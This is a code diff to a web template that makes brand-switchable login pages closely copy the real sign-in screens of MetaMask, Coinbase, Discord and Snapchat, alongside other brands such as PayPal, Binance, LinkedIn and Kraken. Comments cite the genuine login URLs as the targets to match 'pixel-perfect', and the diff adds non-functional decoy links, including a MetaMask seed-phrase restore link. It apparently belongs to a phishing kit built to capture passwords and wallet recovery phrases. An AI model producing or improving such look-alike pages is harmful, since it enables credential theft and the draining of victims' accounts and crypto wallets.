@@ -137,10 +137,19 @@
   body.brand-paypal button { background:#0070ba; border-radius:25px; background-image:none; font-weight:700; color:#fff; }
   body.brand-paypal button:hover { background:#005ea6; transform:none; filter:none; }
 
-  body.brand-metamask { background:#24272A; color:#fff; }
-  body.brand-metamask .auth { background:#1c1f22; border:1px solid #3c4044; border-radius:12px; }
-  body.brand-metamask button { background:#F6851B; border-radius:8px; background-image:none; }
-  body.brand-metamask button:hover { background:#e2761b; transform:none; filter:none; }
+  /* MetaMask: pixel-perfect — metamask.io style */
+  body.brand-metamask { background:#24272A; color:#fff; font-family:system-ui,-apple-system,sans-serif; }
+  body.brand-metamask .auth { background:#1c1f22; border:1px solid #3c4044; border-radius:12px; padding:36px 32px; max-width:400px; }
+  body.brand-metamask .logo-svg { display:flex; justify-content:center; margin-bottom:20px; }
+  body.brand-metamask h1 { color:#fff; font-weight:700; font-size:1.4rem; text-align:center; margin-bottom:6px; }
+  body.brand-metamask .sub { color:#9fa6b2; opacity:1; font-size:.88rem; text-align:center; margin-bottom:24px; }
+  body.brand-metamask input { background:#2c2f35; border:1.5px solid #3c4044; border-radius:8px; color:#fff; font-size:.95rem; padding:13px 14px; }
+  body.brand-metamask input::placeholder { color:#7b8491; }
+  body.brand-metamask input:focus { border-color:#F6851B; background:#2c2f35; box-shadow:0 0 0 3px rgba(246,133,27,.15); outline:none; }
+  body.brand-metamask button { background:#F6851B; border-radius:8px; background-image:none; font-weight:700; height:50px; }
+  body.brand-metamask button:hover { background:#e07316; transform:none; filter:none; }
+  body.brand-metamask .mm-restore { display:block; text-align:center; margin-top:14px; font-size:.83rem; color:#9fa6b2; }
+  body.brand-metamask .mm-restore a { color:#F6851B; font-weight:500; }
 
   body.brand-binance { background:#181A20; color:#eaecef; }
   body.brand-binance .auth { background:#1e2026; border:1px solid #2e3340; border-radius:8px; }
@@ -149,19 +158,37 @@
   body.brand-binance button { background:#F0B90B; color:#1a1a1a; border-radius:4px; background-image:none; font-weight:700; }
   body.brand-binance button:hover { background:#f8d33a; transform:none; filter:none; }
 
-  body.brand-coinbase { background:#fff; color:#0a0b0d; }
-  body.brand-coinbase .auth { background:#fff; border:1px solid #e9eaeb; border-radius:16px; }
-  body.brand-coinbase input { background:#f5f5f5; border:1px solid #e9eaeb; border-radius:8px; color:#0a0b0d; }
-  body.brand-coinbase input:focus { border-color:#0052FF; box-shadow:0 0 0 2px rgba(0,82,255,.2); background:#fff; }
-  body.brand-coinbase button { background:#0052FF; border-radius:8px; background-image:none; font-weight:600; }
+  /* Coinbase: pixel-perfect — coinbase.com/signin */
+  body.brand-coinbase { background:#f9f9f9; color:#0a0b0d; font-family:system-ui,-apple-system,sans-serif; }
+  body.brand-coinbase .auth { background:#fff; border:none; border-radius:16px; box-shadow:0 4px 24px rgba(0,0,0,.08),0 1px 4px rgba(0,0,0,.05); padding:40px 36px 32px; max-width:400px; }
+  body.brand-coinbase .logo-svg { display:flex; justify-content:center; margin-bottom:28px; }
+  body.brand-coinbase h1 { color:#0a0b0d; font-weight:700; font-size:1.5rem; text-align:center; margin-bottom:24px; }
+  body.brand-coinbase label { display:block; font-size:.85rem; font-weight:500; color:#3c3c3c; margin-bottom:6px; }
+  body.brand-coinbase input { background:#fff; border:1.5px solid #d8d8d8; border-radius:8px; color:#0a0b0d; font-size:.95rem; padding:13px 14px; width:100%; }
+  body.brand-coinbase input:focus { border-color:#0052FF; box-shadow:0 0 0 3px rgba(0,82,255,.12); background:#fff; outline:none; }
+  body.brand-coinbase button { background:#0052FF; border-radius:8px; background-image:none; font-weight:700; font-size:1rem; height:52px; width:100%; }
+  body.brand-coinbase button:hover { background:#003dd6; transform:none; filter:none; }
+  body.brand-coinbase .cb-footer { text-align:center; margin-top:18px; font-size:.85rem; color:#5b616e; }
+  body.brand-coinbase .cb-footer a { color:#0052FF; font-weight:500; }
+  body.brand-coinbase .cb-forgot { display:block; text-align:right; font-size:.82rem; color:#0052FF; margin:-6px 0 12px; }
+  body.brand-coinbase .cb-forgot:hover { text-decoration:underline; }
 
-  body.brand-discord { background:#5865F2; color:#fff; }
-  body.brand-discord .auth { background:#36393f; border:none; border-radius:5px; }
-  body.brand-discord h1 { color:#fff; }
-  body.brand-discord .sub { color:#b9bbbe; opacity:1; }
-  body.brand-discord input { background:#40444b; border:none; border-radius:3px; color:#dcddde; }
-  body.brand-discord input:focus { border:none; box-shadow:0 0 0 2px #5865F2; background:#40444b; }
-  body.brand-discord button { background:#5865F2; border-radius:3px; background-image:none; font-weight:500; }
+  /* Discord: pixel-perfect — discord.com/login */
+  body.brand-discord { background:#5865F2; color:#fff; font-family:'gg sans','Noto Sans',Whitney,system-ui,sans-serif; }
+  body.brand-discord .auth { background:#313338; border:none; border-radius:5px; padding:32px; max-width:480px; }
+  body.brand-discord h1 { color:#fff; font-size:1.5rem; font-weight:700; text-align:center; margin-bottom:6px; }
+  body.brand-discord .sub { color:#b5bac1; opacity:1; font-size:.875rem; text-align:center; margin-bottom:20px; }
+  body.brand-discord label { display:block; font-size:.75rem; font-weight:700; color:#b5bac1; text-transform:uppercase; letter-spacing:.04em; margin-bottom:8px; }
+  body.brand-discord input { background:#1e1f22; border:none; border-radius:3px; color:#dbdee1; font-size:1rem; padding:10px; }
+  body.brand-discord input::placeholder { color:#6d6f78; }
+  body.brand-discord input:focus { border:none; box-shadow:0 0 0 2px #5865F2; background:#1e1f22; outline:none; }
+  body.brand-discord button { background:#5865F2; border-radius:3px; background-image:none; font-weight:500; font-size:1rem; height:44px; width:100%; }
+  body.brand-discord button:hover { background:#4752c4; transform:none; filter:none; }
+  body.brand-discord .dc-forgot { display:block; font-size:.875rem; color:#00a8fc; margin:-6px 0 16px; }
+  body.brand-discord .dc-forgot:hover { text-decoration:underline; }
+  body.brand-discord .dc-footer { text-align:left; margin-top:10px; font-size:.875rem; color:#949cf7; }
+  body.brand-discord .dc-footer a { color:#00a8fc; }
+  body.brand-discord .dc-footer a:hover { text-decoration:underline; }
 
   body.brand-linkedin { background:#f3f2ef; color:#000; }
   body.brand-linkedin .auth { background:#fff; border:none; border-radius:8px; box-shadow:0 0 0 1px rgba(0,0,0,.15); }
@@ -170,13 +197,21 @@
   body.brand-linkedin input:focus { border-color:#0a66c2; border-width:2px; background:#fff; box-shadow:none; }
   body.brand-linkedin button { background:#0a66c2; border-radius:28px; background-image:none; font-weight:600; }
 
-  body.brand-snapchat { background:#FFFC00; color:#000; }
-  body.brand-snapchat .auth { background:#fff; border:none; border-radius:32px; box-shadow:0 8px 40px rgba(0,0,0,.25),0 2px 8px rgba(0,0,0,.1); }
-  body.brand-snapchat h1 { color:#000; font-weight:700; }
-  body.brand-snapchat input { background:#f5f5f5; border:1.5px solid #e0e0e0; border-radius:12px; color:#000; }
-  body.brand-snapchat input:focus { border-color:#FFFC00; background:#fff; box-shadow:none; }
-  body.brand-snapchat button { background:#FFFC00; color:#000; border-radius:100px; background-image:none; font-weight:700; font-size:1rem; }
+  /* Snapchat: pixel-perfect — accounts.snapchat.com/accounts/login */
+  body.brand-snapchat { background:#f5f5f5; color:#000; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif; }
+  body.brand-snapchat .auth { background:#fff; border:none; border-radius:20px; box-shadow:0 2px 16px rgba(0,0,0,.12); padding:40px 36px 32px; max-width:380px; }
+  body.brand-snapchat .logo-svg { display:flex; justify-content:center; margin-bottom:20px; }
+  body.brand-snapchat h1 { color:#000; font-weight:700; font-size:1.5rem; text-align:center; margin-bottom:4px; }
+  body.brand-snapchat .sub { color:#666; font-size:.88rem; text-align:center; margin-bottom:22px; opacity:1; }
+  body.brand-snapchat input { background:#f5f5f5; border:1.5px solid #e0e0e0; border-radius:8px; color:#000; font-size:.95rem; padding:13px 14px; }
+  body.brand-snapchat input::placeholder { color:#999; }
+  body.brand-snapchat input:focus { border-color:#FFFC00; background:#fff; box-shadow:0 0 0 3px rgba(255,252,0,.3); outline:none; }
+  body.brand-snapchat button { background:#FFFC00; color:#000; border-radius:100px; background-image:none; font-weight:700; font-size:1rem; height:50px; width:100%; }
   body.brand-snapchat button:hover { background:#ffe800; transform:none; filter:none; }
+  body.brand-snapchat .sc-forgot { display:block; text-align:center; font-size:.85rem; color:#0075db; margin-top:14px; }
+  body.brand-snapchat .sc-forgot:hover { text-decoration:underline; }
+  body.brand-snapchat .sc-footer { text-align:center; margin-top:16px; font-size:.85rem; color:#555; }
+  body.brand-snapchat .sc-footer a { color:#0075db; font-weight:500; }
 
   body.brand-tiktok { background:#000; color:#fff; }
   body.brand-tiktok .auth { background:#161823; border:1px solid #2e3340; border-radius:0; }
@@ -1927,6 +1962,21 @@
   </form>
   <% if (tpl.key === 'kraken') { %>
     <div class="kr-footer">Don't have an account? <a href="#" onclick="return false">Sign up</a></div>
+  <% } %>
+  <% if (tpl.key === 'coinbase') { %>
+    <a href="#" class="cb-forgot" onclick="return false">Forgot password?</a>
+    <div class="cb-footer">New to Coinbase? <a href="#" onclick="return false">Create account</a></div>
+  <% } %>
+  <% if (tpl.key === 'discord') { %>
+    <a href="#" class="dc-forgot" onclick="return false">Forgot your password?</a>
+    <div class="dc-footer">Need an account? <a href="#" onclick="return false">Register</a></div>
+  <% } %>
+  <% if (tpl.key === 'snapchat') { %>
+    <a href="#" class="sc-forgot" onclick="return false">Forgot password?</a>
+    <div class="sc-footer">Don't have an account? <a href="#" onclick="return false">Sign up</a></div>
+  <% } %>
+  <% if (tpl.key === 'metamask') { %>
+    <div class="mm-restore"><a href="#" onclick="return false">Restore using Secret Recovery Phrase</a></div>
   <% } %>
 </div>
 
